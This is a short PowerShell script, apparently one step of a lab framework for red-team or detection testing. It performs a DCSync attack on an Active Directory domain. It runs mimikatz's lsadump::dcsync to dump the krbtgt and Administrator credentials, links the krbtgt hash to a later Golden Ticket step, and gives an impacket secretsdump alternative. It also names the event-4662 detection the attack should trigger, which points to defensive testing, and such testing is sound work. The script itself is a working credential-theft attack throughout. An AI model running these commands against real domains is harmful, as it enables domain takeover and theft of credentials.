# CADRE — WT#009 DCSync
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#009 - DCSync"
start_attack "009" "DCSync"
require_tool mimikatz.exe

# Requires DS-Replication-Get-Changes[-All] (DA, or an ACL-abuse chain grants it).
step "DCSync krbtgt (for Golden Ticket WT#010)"
run_cmd "mimikatz.exe `"lsadump::dcsync /domain:$DOMAIN_ROOT /user:krbtgt`" exit"

step "DCSync a specific high-value user"
run_cmd "mimikatz.exe `"lsadump::dcsync /domain:$DOMAIN_ROOT /user:Administrator`" exit"

step "Note: a 4662 with the DS-Replication GUID from a non-DC fires cadre-003-dcsync"
run_cmd "Write-Host '  (impacket alt: secretsdump -just-dc cadre.local/chief_command@dc01)'"

result $LASTEXITCODE "DCSync completed"
